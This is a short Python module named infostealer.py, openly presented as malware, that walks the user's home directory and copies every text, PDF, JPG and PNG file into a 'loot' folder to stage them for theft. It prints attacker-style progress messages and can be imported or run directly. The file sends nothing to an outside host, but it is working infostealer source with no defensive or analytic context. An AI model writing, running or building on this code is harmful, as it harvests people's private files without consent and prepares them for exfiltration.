# infostealer.py
# An importable module that finds and stages valuable files.

import os
import shutil

# --- Configuration (Module Level Constants) ---
SEARCH_PATH = os.path.expanduser('~')
TARGET_EXTENSIONS = ('.txt', '.pdf', '.jpg', '.png')
LOOT_DIR = "loot"
# ---------------------------------------------

def start_stealing():
    """Finds and copies target files to the loot directory."""
    
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)
        print(f"[*] Created loot directory: {LOOT_DIR}")

    print(f"[*] Starting search in: {SEARCH_PATH}")

    for root, dirs, files in os.walk(SEARCH_PATH):
        for file in files:
            if file.endswith(TARGET_EXTENSIONS):
                full_path = os.path.join(root, file)
                try:
                    shutil.copy(full_path, LOOT_DIR)
                    print(f"[+] Copied file: {full_path}")
                except Exception as e:
                    # This handles errors like "Permission Denied"
                    print(f"[!] Error copying {full_path}: {e}")
            
    print("\n[*] Staging complete. Check the 'loot' directory.")

# This block allows the script to be run directly for testing.
if __name__ == '__main__':
    start_stealing()
